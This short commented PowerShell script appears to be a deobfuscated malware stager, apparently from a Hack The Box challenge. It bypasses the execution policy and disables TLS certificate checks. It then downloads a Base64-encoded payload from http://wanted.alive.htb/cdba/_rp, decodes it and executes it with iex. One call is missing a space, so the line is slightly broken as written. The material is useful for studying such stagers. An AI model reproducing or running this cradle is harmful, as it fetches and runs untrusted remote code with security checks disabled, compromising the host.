# Bypass the execution policy for the current process
Set-ExecutionPolicy Bypass -Scope Process -Force

# Disable SSL certificate validation (accept all certificates)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Set the security protocol to use TLS 1.2 (3072)
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072

# Download a Base64-encoded string from the URL, decode it, and execute it
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-objectsystem.net.webclient).downloadstring('http://wanted.alive.htb/cdba/_rp'))))
